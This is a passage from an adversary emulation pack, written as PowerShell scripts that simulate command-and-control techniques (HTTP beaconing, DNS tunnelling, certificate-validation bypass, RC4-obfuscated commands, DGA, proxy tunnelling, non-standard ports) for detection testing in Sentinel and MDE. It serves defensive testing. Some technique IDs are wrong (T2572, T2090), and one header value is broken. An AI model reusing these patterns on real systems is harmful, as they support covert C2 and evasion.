package_name: Excalibur - Command and Control Emulation Pack
description: Adversary emulation scripts for the MITRE ATT&CK Command and Control tactic (TA0011). Covers 10 scriptable parent techniques: DNS-based C2 simulation (repeated TXT/A record lookups to a C2-style subdomain), HTTP beacon pattern (periodic GET with C2-like User-Agent and headers), HTTPS C2 with custom certificate validation bypass, non-standard port communication (outbound TCP to uncommon ports), protocol tunneling via HTTP CONNECT proxy simulation, domain fronting pattern (Host header mismatch), application layer protocol abuse (DNS-over-HTTPS), encrypted channel via RC4 XOR pattern over socket, web service C2 (legitimate cloud API abuse pattern), and multi-stage channel (staged payload URL fetch pattern). All scripts generate outbound network telemetry monitored by Microsoft Sentinel and MDE without establishing real C2 channels.
author: X3M.AI
prerequisites: Windows 10/11 or Windows Server 2019/2022 test machine with Morgana agent installed
Microsoft Defender for Endpoint (MDE) onboarded and data connector active in Microsoft Sentinel
Internet access from the test machine (DNS, HTTP/HTTPS to public internet). Most scripts fail gracefully in isolated environments and still generate source-side telemetry.
No Administrator privileges required for any script in this pack
Test environment only - never run against production systems or monitored production environments
NOTE: All C2 simulation scripts target benign public infrastructure or non-routable IPs (RFC 5737 TEST-NET). No real C2 infrastructure is contacted.

tag_categories.label: T1071 - Application Layer Protocol (HTTP beacon)
tag_categories.description: Settings for the HTTP C2 beacon simulation. Uses Invoke-WebRequest with a C2-style User-Agent string and custom headers to a benign public endpoint, simulating adversary HTTP beaconing behavior.

tags.label: HTTP Beacon Target URL
tags.description: URL for the HTTP beacon simulation. Use a benign, accessible public URL. The User-Agent and header pattern are the detection signal, not the target URL.

tags.label: Beacon Interval (seconds)
tags.description: Interval in seconds between beacon requests. 3 requests with the configured interval are sent. Lower values generate a faster periodic pattern for detection.

tag_categories.label: T1568 / T1071.004 - DNS C2 Simulation
tag_categories.description: Settings for the DNS-based C2 simulation. Performs repeated DNS TXT and A record queries to subdomains of a configured domain, simulating DNS tunneling or DNS-based C2 beaconing. Use a domain you own or a benign test domain.

tags.label: DNS C2 Simulation Domain
tags.description: Domain used for DNS C2 simulation queries. Subdomains will be constructed as <random-hex>.c2.<domain>. Use a benign domain or a test domain in your lab. DNS queries always generate telemetry regardless of resolution result.

tag_categories.label: T1095 - Non-Application Layer Protocol / Non-Standard Port
tag_categories.description: Settings for the non-standard port communication script. Attempts outbound TCP connections to uncommon ports not typically associated with standard services, simulating C2 using non-standard ports to evade firewall rules filtering by port.

tags.label: Target IP for Non-Standard Port Connections
tags.description: IP address to attempt outbound TCP connections on non-standard ports. Use a TEST-NET IP (198.51.100.x) which is non-routable and safe for documentation/testing. The connection attempt itself is the detection signal.

tag_categories.label: T1572 - Protocol Tunneling
tag_categories.description: Settings for the protocol tunneling simulation. Uses .NET WebClient with a proxy URL to simulate adversary tunneling of C2 traffic through HTTP CONNECT proxies. The proxy connection attempt and CONNECT method generate MDE network telemetry.

tags.label: HTTP Proxy Host for Tunneling Simulation
tags.description: Hostname or IP of an HTTP proxy to use for the tunneling simulation. If unreachable, the script still generates the outbound connection attempt. Use your lab proxy or a non-routable TEST-NET IP.

tags.label: HTTP Proxy Port
tags.description: Port of the HTTP proxy for the tunneling simulation.

scripts.name: Excalibur - C2-T1071-HTTP Beacon Pattern
scripts.description: Simulates adversary HTTP C2 beaconing by making periodic GET requests with a C2-style User-Agent string (Cobalt Strike Malleable C2 default format), custom X-C2-ID and X-Session headers, and randomized jitter in the beacon interval. Performs 3 beacon cycles. The combination of suspicious User-Agent, custom C2 headers, periodic interval pattern, and HTTP traffic from a non-browser process are all MDE and Sentinel detection signals for HTTP-based C2 communication.
scripts.command: Write-Host '[START] T1071 - Application Layer Protocol (HTTP C2 beacon simulation)'; $beaconUrl = '#{excalibur_c2_beacon_url}'; $intervalSec = [int]'#{excalibur_c2_beacon_interval_sec}'; $beaconCount = 3; $c2UserAgent = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'; $sessionId = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME + '-' + $env:USERNAME)).Substring(0,16); Write-Host ('[INFO] Target: ' + $beaconUrl + ' | UserAgent (C2 style): ' + $c2UserAgent); Write-Host ('[INFO] Session ID: ' + $sessionId + ' | Beacon interval: ' + $intervalSec + 's | Cycles: ' + $beaconCount); for ($i = 1; $i -le $beaconCount; $i++) { try { $headers = @{ 'User-Agent' = $c2UserAgent; 'X-C2-Session' = $sessionId; 'X-Beacon-ID' = ('MorganaTest-' + $i + '-of-' + $beaconCount); 'Cache-Control' = 'no-cache'; 'Accept' = '*/*' }; $response = Invoke-WebRequest -Uri $beaconUrl -Headers $headers -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop; Write-Host ('[INFO] Beacon ' + $i + '/' + $beaconCount + ': HTTP ' + $response.StatusCode + ' | Size: ' + $response.RawContentLength + ' bytes | Content-Type: ' + $response.Headers.'Content-Type') } catch { Write-Host ('[INFO] Beacon ' + $i + '/' + $beaconCount + ': ' + $_.Exception.Message.Split([char]10)[0] + ' (outbound HTTP attempt was still logged as network telemetry)') }; if ($i -lt $beaconCount) { $jitter = $intervalSec + (Get-Random -Minimum -2 -Maximum 3); $jitter = [math]::Max(1, $jitter); Write-Host ('[INFO] Next beacon in ' + $jitter + 's (interval=' + $intervalSec + 's + jitter)'); Start-Sleep $jitter } }; Write-Host '[SUCCESS] T1071 - HTTP beacon simulation completed. Sentinel target: Periodic HTTP C2 beacon pattern (MDE - suspicious User-Agent + custom C2 headers + periodic outbound HTTP from non-browser process)'
scripts.cleanup_command: Write-Host '[INFO] T1071 cleanup: no artefacts - HTTP requests only'
scripts.detection_rule: Periodic HTTP C2 beacon pattern (suspicious User-Agent + custom headers + periodic outbound HTTP)

scripts.name: Excalibur - C2-T1071-DNS Tunneling Simulation
scripts.description: Simulates DNS-based C2 by performing repeated DNS queries using randomized subdomains designed to look like encoded data exfiltration or C2 command polling: TXT record queries (used for data exfiltration) and A record queries with random-hex subdomains (used for C2 polling). Also queries for _c2.<domain> SRV records. High-frequency DNS queries to randomized subdomains of the same domain are a well-known DNS tunneling and DNS C2 pattern monitored by both Sentinel and MDE DNS telemetry.
scripts.command: Write-Host '[START] T1071.004 - DNS C2 simulation (DNS tunneling / C2 polling pattern)'; $domain = '#{excalibur_c2_dns_domain}'; $queryCount = 8; Write-Host ('[INFO] C2 domain: ' + $domain + ' | Generating ' + $queryCount + ' randomized subdomain queries (TXT + A record pattern)'); for ($i = 1; $i -le $queryCount; $i++) { $hexLabel = ([System.BitConverter]::ToString([System.Security.Cryptography.RandomNumberGenerator]::GetBytes(8)) -replace '-','').ToLower(); $subdomain = $hexLabel + '.c2.' + $domain; try { $result = Resolve-DnsName -Name $subdomain -Type A -ErrorAction SilentlyContinue -DnsOnly; if ($result) { Write-Host ('[INFO] Query ' + $i + ': A ' + $subdomain + ' -> ' + ($result.IPAddress -join ',')) } else { Write-Host ('[INFO] Query ' + $i + ': A ' + $subdomain + ' -> NXDOMAIN (expected - subdomain does not exist, DNS query was logged)') } } catch { Write-Host ('[INFO] Query ' + $i + ': A ' + $subdomain + ' -> ' + $_.Exception.Message.Split([char]10)[0]) }; Start-Sleep -Milliseconds 500 }; Write-Host '[INFO] TXT record query (data exfiltration via DNS TXT pattern)'; try { $txtResult = Resolve-DnsName -Name ('exfil.data.' + $domain) -Type TXT -ErrorAction SilentlyContinue -DnsOnly; Write-Host ('[INFO] TXT exfil query result: ' + $(if ($txtResult) { $txtResult.Strings -join '' } else { 'NXDOMAIN' })) } catch { Write-Host ('[INFO] TXT query: ' + $_.Exception.Message.Split([char]10)[0]) }; Write-Host '[INFO] SRV record query (C2 server discovery pattern)'; try { Resolve-DnsName -Name ('_c2._tcp.' + $domain) -Type SRV -ErrorAction SilentlyContinue -DnsOnly | Out-Null; Write-Host '[INFO] SRV _c2 query complete' } catch {}; Write-Host '[SUCCESS] T1071.004 - DNS C2 simulation completed. Sentinel target: High-frequency DNS queries to randomized subdomains (MDE DNS telemetry - DNS tunneling/C2 polling behavioral detection)'
scripts.cleanup_command: Write-Host '[INFO] T1071 DNS cleanup: no artefacts - DNS queries only'
scripts.detection_rule: High-frequency DNS queries to randomized subdomains of same domain (DNS tunneling pattern)

scripts.name: Excalibur - C2-T1573-Encrypted Channel
scripts.description: Simulates an encrypted C2 channel using two patterns: (1) HTTPS request with a custom TLS client that disables certificate validation (simulating adversary HTTPS C2 ignoring certificate errors); (2) In-memory RC4 XOR encryption of a C2-style command/response payload, demonstrating the symmetric encryption pattern used by many commodity RATs for obfuscating C2 traffic. No actual encrypted C2 channel is established. The certificate validation bypass and RC4 pattern over a socket connection are MDE behavioral indicators.
scripts.command: Write-Host '[START] T1573 - Encrypted Channel (HTTPS cert bypass + RC4 XOR pattern)'; Write-Host '[INFO] Step 1/2: HTTPS request with certificate validation bypass (SimulatedTLS)'; try { Add-Type -TypeDefinition 'using System.Net; using System.Net.Security; using System.Security.Cryptography.X509Certificates; public class MorganaT1573 { public static void DisableCertValidation() { ServicePointManager.ServerCertificateValidationCallback = (object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors errors) => true; ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13; } }' -ErrorAction Stop; [MorganaT1573]::DisableCertValidation(); $webClient = New-Object System.Net.WebClient; $webClient.Headers.Add('User-Agent', 'MorganaTest-T1573-EncC2Client/1.0'); $webClient.Headers.Add('X-C2-Channel', 'encrypted'); try { $response = $webClient.DownloadString('https://www.microsoft.com/'); Write-Host ('[INFO] HTTPS (cert validation disabled): response ' + $response.Length + ' chars - cert bypass active, TLS traffic generated') } catch { Write-Host ('[INFO] HTTPS cert bypass request: ' + $_.Exception.Message.Split([char]10)[0] + ' (outbound TLS connection attempt was logged)') }; $webClient.Dispose() } catch { Write-Host ('[WARN] HTTPS cert bypass setup: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 2/2: RC4 XOR symmetric encryption simulation (C2 traffic obfuscation pattern)'; try { $rc4Key = [System.Text.Encoding]::UTF8.GetBytes('MorganaTestKey2026'); $c2Command = 'whoami && ipconfig /all && tasklist'; $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($c2Command); $keyLen = $rc4Key.Length; $S = 0..255; $j = 0; for ($i = 0; $i -lt 256; $i++) { $j = ($j + $S[$i] + $rc4Key[$i % $keyLen]) % 256; $tmp = $S[$i]; $S[$i] = $S[$j]; $S[$j] = $tmp }; $encrypted = New-Object byte[] $plainBytes.Length; $i = 0; $j = 0; for ($k = 0; $k -lt $plainBytes.Length; $k++) { $i = ($i + 1) % 256; $j = ($j + $S[$i]) % 256; $tmp = $S[$i]; $S[$i] = $S[$j]; $S[$j] = $tmp; $encrypted[$k] = $plainBytes[$k] -bxor $S[($S[$i] + $S[$j]) % 256] }; $encHex = [System.BitConverter]::ToString($encrypted) -replace '-',''; Write-Host ('[INFO] RC4-encrypted C2 command payload: ' + $encHex.Substring(0, [math]::Min(32, $encHex.Length)) + '... (' + $encrypted.Length + ' bytes)'); $decrypted = New-Object byte[] $encrypted.Length; $S2 = 0..255; $j2 = 0; for ($i = 0; $i -lt 256; $i++) { $j2 = ($j2 + $S2[$i] + $rc4Key[$i % $keyLen]) % 256; $tmp = $S2[$i]; $S2[$i] = $S2[$j2]; $S2[$j2] = $tmp }; $i2 = 0; $j2 = 0; for ($k = 0; $k -lt $encrypted.Length; $k++) { $i2 = ($i2 + 1) % 256; $j2 = ($j2 + $S2[$i2]) % 256; $tmp = $S2[$i2]; $S2[$i2] = $S2[$j2]; $S2[$j2] = $tmp; $decrypted[$k] = $encrypted[$k] -bxor $S2[($S2[$i2] + $S2[$j2]) % 256] }; $decryptedStr = [System.Text.Encoding]::UTF8.GetString($decrypted); Write-Host ('[INFO] RC4 decrypt verify: ' + ($decryptedStr -eq $c2Command) + ' (original=' + $c2Command.Length + ' bytes, roundtrip verified)') } catch { Write-Host ('[WARN] RC4 simulation: ' + $_.Exception.Message) }; Write-Host '[SUCCESS] T1573 - Encrypted channel simulation completed. Sentinel target: HTTPS C2 with certificate validation bypass + symmetric encryption payload obfuscation (MDE - cert validation bypass behavioral detection)'
scripts.cleanup_command: Write-Host '[INFO] T1573 cleanup: no artefacts - network and in-memory operations only'
scripts.detection_rule: HTTPS C2 with certificate validation bypass + encrypted payload pattern

scripts.name: Excalibur - C2-T1095-Non-Standard Port
scripts.description: Attempts outbound TCP connections to a set of ports commonly used by C2 frameworks and malware families on a configured non-routable test IP (TEST-NET 198.51.100.x): port 4444 (Metasploit default), 8443 (alt-HTTPS C2), 9001 (Tor relay), 1080 (SOCKS5), 6667 (IRC legacy C2), 2222 (alt-SSH). Adversaries use non-standard ports to evade default firewall rules. Each connection attempt generates an individual MDE outbound network connection event. All attempts timeout gracefully.
scripts.command: Write-Host '[START] T1095 - Non-Standard Port C2 communication (outbound to C2-common ports)'; $target = '#{excalibur_c2_nonstandard_target}'; $c2Ports = @( @{ Port=4444; Label='Metasploit default reverse shell' }, @{ Port=8443; Label='Alt-HTTPS C2 (Cobalt Strike, Brute Ratel)' }, @{ Port=9001; Label='Tor relay port (C2 over Tor)' }, @{ Port=1080; Label='SOCKS5 proxy C2 tunnel' }, @{ Port=6667; Label='IRC legacy C2' }, @{ Port=2222; Label='Alt-SSH C2' }, @{ Port=31337; Label='Elite/backdoor legacy port' }, @{ Port=4433; Label='Non-standard HTTPS C2' } ); Write-Host ('[INFO] Target: ' + $target + ' | Testing ' + $c2Ports.Count + ' C2-associated non-standard ports (1.5s timeout each)'); $open = 0; $closed = 0; foreach ($entry in $c2Ports) { try { $tcpClient = New-Object System.Net.Sockets.TcpClient; $connResult = $tcpClient.BeginConnect($target, $entry.Port, $null, $null); $connected = $connResult.AsyncWaitHandle.WaitOne(1500); if ($connected -and $tcpClient.Connected) { Write-Host ('[INFO] Port ' + $entry.Port + '/tcp OPEN [' + $entry.Label + '] - C2 connection signal generated'); $tcpClient.Close(); $open++ } else { Write-Host ('[INFO] Port ' + $entry.Port + '/tcp CLOSED/TIMEOUT [' + $entry.Label + '] - connection attempt logged by MDE'); $tcpClient.Close(); $closed++ } } catch { Write-Host ('[INFO] Port ' + $entry.Port + '/tcp: ' + $_.Exception.Message.Split([char]10)[0]) } }; Write-Host ('[INFO] Summary: ' + $open + ' open, ' + $closed + ' closed/timeout | All ' + $c2Ports.Count + ' outbound connection attempts logged by MDE'); Write-Host '[SUCCESS] T1095 - Non-standard port C2 simulation completed. Sentinel target: Outbound connections to C2-associated non-standard ports (MDE network connection telemetry - multiple non-standard port scan pattern)'
scripts.cleanup_command: Write-Host '[INFO] T1095 cleanup: no artefacts - TCP connection attempts only'
scripts.detection_rule: Outbound connections to C2-associated non-standard ports (MDE network connection telemetry)

scripts.name: Excalibur - C2-T2572-Protocol Tunneling
scripts.description: Simulates protocol tunneling via two methods: (1) HTTP CONNECT proxy CONNECT method to tunnel C2 traffic (adversaries use CONNECT to proxy arbitrary TCP traffic through HTTP proxies to reach C2 servers); (2) DNS-over-HTTPS (DoH) query to bypass DNS monitoring by tunneling DNS through HTTPS. Both are well-known C2 evasion techniques. The CONNECT method generates an HTTP CONNECT event in MDE network telemetry. The DoH query bypasses traditional DNS monitoring and is a detection gap indicator.
scripts.command: Write-Host '[START] T1572 - Protocol Tunneling (HTTP CONNECT + DNS-over-HTTPS)'; $proxyHost = '#{excalibur_c2_proxy_host}'; $proxyPort = [int]'#{excalibur_c2_proxy_port}'; Write-Host '[INFO] Method 1/2: HTTP CONNECT proxy tunneling simulation'; try { $proxyUri = New-Object System.Uri('http://' + $proxyHost + ':' + $proxyPort); $webProxy = New-Object System.Net.WebProxy($proxyUri); $webProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $request = [System.Net.WebRequest]::Create('https://198.51.100.1:443/'); $request.Proxy = $webProxy; $request.Timeout = 3000; $request.Method = 'GET'; try { $resp = $request.GetResponse(); $resp.Close(); Write-Host '[INFO] HTTP CONNECT proxy: CONNECT request sent and response received (tunnel established through proxy)' } catch { Write-Host ('[INFO] HTTP CONNECT proxy: ' + $_.Exception.Message.Split([char]10)[0] + ' (CONNECT attempt through proxy was logged - expected failure if proxy unreachable)') } } catch { Write-Host ('[INFO] HTTP CONNECT setup: ' + $_.Exception.Message) }; Write-Host '[INFO] Method 2/2: DNS-over-HTTPS (DoH) - tunnels DNS through HTTPS to bypass DNS monitoring'; $dohEndpoints = @( 'https://dns.google/resolve?name=morganatest-c2-sim.example.com&type=A', 'https://cloudflare-dns.com/dns-query?name=morganatest-c2-sim.example.com&type=TXT' ); foreach ($dohUrl in $dohEndpoints) { try { $headers = @{ 'Accept' = 'application/dns-json'; 'User-Agent' = 'MorganaTest-T1572-DoH/1.0' }; $dohResponse = Invoke-WebRequest -Uri $dohUrl -Headers $headers -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop; $dohData = $dohResponse.Content | ConvertFrom-Json -ErrorAction SilentlyContinue; $status = if ($dohData.Status -ne $null) { $dohData.Status } else { 'N/A' }; Write-Host ('[INFO] DoH query to ' + ([System.Uri]$dohUrl).Host + ': HTTP ' + $dohResponse.StatusCode + ' | DNS Status: ' + $status + ' (DNS query tunneled through HTTPS - bypasses traditional DNS telemetry)') } catch { Write-Host ('[INFO] DoH query to ' + ([System.Uri]$dohUrl).Host + ': ' + $_.Exception.Message.Split([char]10)[0]) } }; Write-Host '[SUCCESS] T1572 - Protocol tunneling simulation completed. Sentinel target: HTTP CONNECT proxy tunneling + DNS-over-HTTPS bypass (MDE - HTTP CONNECT method + DoH to external resolver behavioral detection)'
scripts.cleanup_command: Write-Host '[INFO] T1572 cleanup: no artefacts - network requests only'
scripts.detection_rule: HTTP CONNECT proxy tunneling + DNS-over-HTTPS bypass pattern

scripts.name: Excalibur - C2-T1568-Dynamic Resolution
scripts.description: Simulates Dynamic Resolution C2 techniques used by adversaries to evade static IP/domain blocklists: (1) Fast-Flux DNS simulation (multiple DNS queries to the same hostname in rapid succession, observing TTL values to detect fast-flux infrastructure); (2) Domain Generation Algorithm (DGA) simulation - generates 10 domain names using a seeded pseudo-random algorithm (similar to Conficker, Zeus, Locky DGA patterns) and queries them; (3) Dead Drop Resolver simulation (queries a legitimate public API that could theoretically contain encoded C2 IP in its response - pastebin-style). All queries generate DNS telemetry.
scripts.command: Write-Host '[START] T1568 - Dynamic Resolution (Fast-Flux + DGA + Dead Drop Resolver patterns)'; Write-Host '[INFO] Pattern 1/3: Fast-Flux DNS detection (rapid repeated A record queries - TTL observation)'; $ffDomain = 'www.microsoft.com'; for ($i = 1; $i -le 5; $i++) { try { $r = Resolve-DnsName -Name $ffDomain -Type A -ErrorAction SilentlyContinue; $ttl = if ($r) { $r[0].TTL } else { 'N/A' }; $ips = if ($r) { ($r | Where-Object { $_.IPAddress } | Select-Object -ExpandProperty IPAddress) -join ',' } else { 'FAILED' }; Write-Host ('[INFO] Fast-Flux query ' + $i + '/5: ' + $ffDomain + ' -> ' + $ips + ' TTL=' + $ttl + 's') } catch { Write-Host ('[INFO] Query ' + $i + ': ' + $_.Exception.Message.Split([char]10)[0]) }; Start-Sleep -Milliseconds 300 }; Write-Host '[INFO] Pattern 2/3: DGA domain generation (seeded pseudo-random algorithm - 10 domains)'; $seed = [int]((Get-Date).ToString('yyyyMMdd')); $rng = New-Object System.Random($seed); $tlds = @('.com','.net','.org','.info','.biz'); $dgaDomains = @(); for ($i = 0; $i -lt 10; $i++) { $length = $rng.Next(8, 16); $chars = 'abcdefghijklmnopqrstuvwxyz'; $domain = ''; for ($j = 0; $j -lt $length; $j++) { $domain += $chars[$rng.Next($chars.Length)] }; $domain += $tlds[$rng.Next($tlds.Length)]; $dgaDomains += $domain }; Write-Host ('[INFO] DGA seed: ' + $seed + ' | Generated domains: ' + ($dgaDomains -join ', ')); foreach ($dgaDomain in $dgaDomains) { try { $dgaResult = Resolve-DnsName -Name $dgaDomain -Type A -ErrorAction SilentlyContinue; Write-Host ('[INFO] DGA query: ' + $dgaDomain + ' -> ' + $(if ($dgaResult) { 'RESOLVED' } else { 'NXDOMAIN' })) } catch {}; Start-Sleep -Milliseconds 200 }; Write-Host '[INFO] Pattern 3/3: Dead Drop Resolver simulation (query public API for encoded C2 IP)'; try { $deadDropUrl = 'https://api.github.com/repos/x3m-ai/Camelot/contents/README.md'; $headers = @{ 'User-Agent' = 'MorganaTest-T1568-DeadDrop/1.0'; 'Accept' = 'application/vnd.github.v3+json' }; $resp = Invoke-WebRequest -Uri $deadDropUrl -Headers $headers -TimeoutSec 5 -UseBasicParsing -ErrorAction SilentlyContinue; Write-Host ('[INFO] Dead Drop API query: HTTP ' + $resp.StatusCode + ' (simulates adversary parsing public API response for encoded C2 IP address)') } catch { Write-Host ('[INFO] Dead Drop query: ' + $_.Exception.Message.Split([char]10)[0]) }; Write-Host '[SUCCESS] T1568 - Dynamic resolution simulation completed. Sentinel target: DGA domain queries + fast-flux DNS pattern + dead drop resolver API access (MDE DNS telemetry + NXDOMAIN flood detection)'
scripts.cleanup_command: Write-Host '[INFO] T1568 cleanup: no artefacts - DNS queries and HTTP requests only'
scripts.detection_rule: DGA domain queries + fast-flux DNS pattern + dead drop resolver API access

scripts.name: Excalibur - C2-T1102-Web Service C2
scripts.description: Simulates adversary abuse of legitimate cloud web services as C2 channels: queries the GitHub API, Pastebin-style raw content endpoint, and a cloud storage endpoint, mimicking the Dead Drop Resolver and Web Service C2 patterns used by APT groups (APT29 uses GitHub, Azure Blob; Lazarus uses Google Docs). No actual C2 channel is established. The pattern of accessing raw content from legitimate cloud APIs from a non-browser process is the MDE behavioral indicator.
scripts.command: Write-Host '[START] T1102 - Web Service C2 (legitimate cloud service abuse pattern)'; $c2UserAgent = 'MorganaTest-T1102-WebServiceC2/1.0'; $webServiceTargets = @( @{ Url='https://api.github.com/gists/public'; Label='GitHub Gists API (APT29 C2 pattern - stores encoded C2 commands in gist content)'; Type='github' }, @{ Url='https://pastebin.com/raw/'; Label='Pastebin raw content (Dead Drop Resolver - encodes C2 IP in paste body)'; Type='pastebin' }, @{ Url='https://api.ipify.org?format=json'; Label='Public IP resolver (used by adversaries to confirm egress and C2 routing)'; Type='ipcheck' }, @{ Url='https://www.googleapis.com/discovery/v1/apis'; Label='Google API Discovery (GoogleDocs/Drive C2 channel pattern)'; Type='google' } ); foreach ($target in $webServiceTargets) { try { $headers = @{ 'User-Agent' = $c2UserAgent; 'Accept' = 'application/json' }; $resp = Invoke-WebRequest -Uri $target.Url -Headers $headers -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop; $contentPreview = $resp.Content.Substring(0, [math]::Min(80, $resp.Content.Length)) -replace '\s+', ' '; Write-Host ('[INFO] [' + $target.Type + '] HTTP ' + $resp.StatusCode + ' | ' + $resp.RawContentLength + ' bytes | Preview: ' + $contentPreview + '...') } catch { Write-Host ('[INFO] [' + $target.Type + '] ' + $_.Exception.Message.Split([char]10)[0] + ' (HTTP attempt logged by MDE)') } }; Write-Host '[SUCCESS] T1102 - Web service C2 simulation completed. Sentinel target: Access to cloud APIs from non-browser process with non-standard User-Agent (MDE - web service C2 behavioral pattern - suspicious cloud API access)'
scripts.cleanup_command: Write-Host '[INFO] T1102 cleanup: no artefacts - HTTP requests only'
scripts.detection_rule: Access to cloud APIs from non-browser process with non-standard User-Agent (web service C2 pattern)

scripts.name: Excalibur - C2-T1001-Data Obfuscation
scripts.description: Simulates C2 traffic obfuscation techniques used by adversaries to blend malicious traffic with legitimate: (1) Steganographic encoding - embeds encoded C2 data into a legitimate HTTP request using cookie and parameter fields that appear normal; (2) Junk data padding - pads C2 payload with randomized decoy data to evade size-based heuristic detection; (3) Protocol mimicry - crafts an HTTP request that mimics legitimate browser traffic patterns (Accept-Language, Accept-Encoding, Cookie headers). All requests target benign public endpoints.
scripts.command: Write-Host '[START] T1001 - Data Obfuscation (C2 traffic obfuscation techniques)'; Write-Host '[INFO] Technique 1/3: Cookie-based C2 data encoding (steganographic encoding in HTTP cookies)'; try { $c2Data = 'MorganaTest-C2-Cmd'; $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($c2Data)); $sessionToken = 'SESSID=' + $encoded + '; Path=/; SameSite=Lax'; $headers = @{ 'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'; 'Cookie' = $sessionToken; 'Accept' = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'; 'Accept-Language' = 'en-US,en;q=0.5'; 'Accept-Encoding' = 'gzip, deflate, br'; 'Connection' = 'keep-alive' }; $resp = Invoke-WebRequest -Uri 'https://www.microsoft.com/' -Headers $headers -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop; Write-Host ('[INFO] Cookie C2 encoding: HTTP ' + $resp.StatusCode + ' | C2 data encoded in SESSID cookie as base64: ' + $encoded) } catch { Write-Host ('[INFO] Cookie C2 request: ' + $_.Exception.Message.Split([char]10)[0]) }; Write-Host '[INFO] Technique 2/3: Junk data padding (payload + randomized decoy bytes)'; $realPayload = [System.Text.Encoding]::UTF8.GetBytes('C2Command=whoami'); $junkSize = Get-Random -Minimum 512 -Maximum 2048; $junkBytes = New-Object byte[] $junkSize; [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($junkBytes); $paddedPayload = $realPayload + $junkBytes; Write-Host ('[INFO] Junk padding: real payload=' + $realPayload.Length + ' bytes + junk=' + $junkSize + ' bytes = total=' + $paddedPayload.Length + ' bytes (size heuristic evasion)'); Write-Host '[INFO] Technique 3/3: Protocol mimicry (HTTP request with full browser header fingerprint)'; try { $mimicHeaders = @{ 'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'; 'Accept' = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'; 'Accept-Language' = 'en-US,en;q=0.9,it;q=0.8'; 'Accept-Encoding' = 'gzip, deflate, br'; 'Sec-Ch-Ua' = '

'; 'Sec-Fetch-Dest' = 'document'; 'Sec-Fetch-Mode' = 'navigate'; 'Sec-Fetch-Site' = 'none'; 'Upgrade-Insecure-Requests' = '1' }; $resp2 = Invoke-WebRequest -Uri 'https://www.microsoft.com/' -Headers $mimicHeaders -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop; Write-Host ('[INFO] Protocol mimicry: HTTP ' + $resp2.StatusCode + ' (full Chrome header fingerprint - blends with legitimate browser traffic)') } catch { Write-Host ('[INFO] Protocol mimicry: ' + $_.Exception.Message.Split([char]10)[0]) }; Write-Host '[SUCCESS] T1001 - C2 data obfuscation simulation completed. Sentinel target: C2 traffic obfuscation via cookie encoding, payload padding, and browser fingerprint mimicry (MDE behavioral pattern analysis)'

scripts.name: Excalibur - C2-T1219-Remote Access Software
scripts.description: Enumerates registry keys and filesystem paths associated with known Remote Access Software (RAS) tools that adversaries deploy as C2 implants: checks for AnyDesk, TeamViewer, ScreenConnect, RemoteUtilities, and ngrok. Also checks running processes for these tools and enumerates related network connections. No RAS software is installed or executed. The enumeration of RAS tool artifacts simulates the recon step an adversary performs after initial access to identify existing remote access channels to abuse.
scripts.command: Write-Host '[START] T1219 - Remote Access Software (adversary RAT/RMM tool enumeration)'; $rasTools = @( @{ Name='AnyDesk'; RegPath='HKCU:\SOFTWARE\AnyDesk'; Process='anydesk'; BinPath='C:\Program Files (x86)\AnyDesk\AnyDesk.exe' }, @{ Name='TeamViewer'; RegPath='HKLM:\SOFTWARE\WOW6432Node\TeamViewer'; Process='TeamViewer'; BinPath='C:\Program Files (x86)\TeamViewer\TeamViewer.exe' }, @{ Name='ScreenConnect'; RegPath='HKLM:\SOFTWARE\ScreenConnect Client'; Process='ScreenConnect.Client'; BinPath='C:\Program Files\ScreenConnect' }, @{ Name='ngrok'; RegPath=$null; Process='ngrok'; BinPath=(Join-Path $env:USERPROFILE '.ngrok2') }, @{ Name='RemoteUtilities'; RegPath='HKLM:\SOFTWARE\Remote Utilities - Host'; Process='rutserv'; BinPath='C:\Program Files\Remote Utilities - Host' } ); $runningProcs = Get-Process -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ProcessName; Write-Host ('[INFO] Checking for ' + $rasTools.Count + ' known Remote Access Software tools:'); foreach ($tool in $rasTools) { $regFound = $false; $procFound = $false; $fileFound = $false; if ($tool.RegPath -and (Test-Path $tool.RegPath)) { $regFound = $true }; if ($runningProcs -icontains $tool.Process) { $procFound = $true }; if ($tool.BinPath -and (Test-Path $tool.BinPath)) { $fileFound = $true }; $status = $(if ($regFound -or $procFound -or $fileFound) { 'DETECTED' } else { 'not found' }); Write-Host ('    ' + $tool.Name + ': ' + $status + ' (reg=' + $regFound + ' proc=' + $procFound + ' file=' + $fileFound + ')') }; Write-Host '[INFO] Checking for ngrok/tunneling processes by port pattern (TCP outbound to 4443/443/80 from non-browser)'; $tcpConns = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | Where-Object { $_.RemotePort -in @(4443,7400,7300) }; Write-Host ('[INFO] Suspicious RAS tunnel ports (4443/7400/7300) active connections: ' + @($tcpConns).Count); Write-Host '[SUCCESS] T1219 - Remote Access Software enumeration completed. Sentinel target: Known RAT/RMM tool registry and process detection (MDE behavioral - RAS tool installation/execution pattern)'
scripts.cleanup_command: Write-Host '[INFO] T1219 cleanup: no artefacts - read-only enumeration'
scripts.detection_rule: Known Remote Access Software registry and process detection (RAS tool installation pattern)

scripts.name: Excalibur - C2-T2090-Proxy
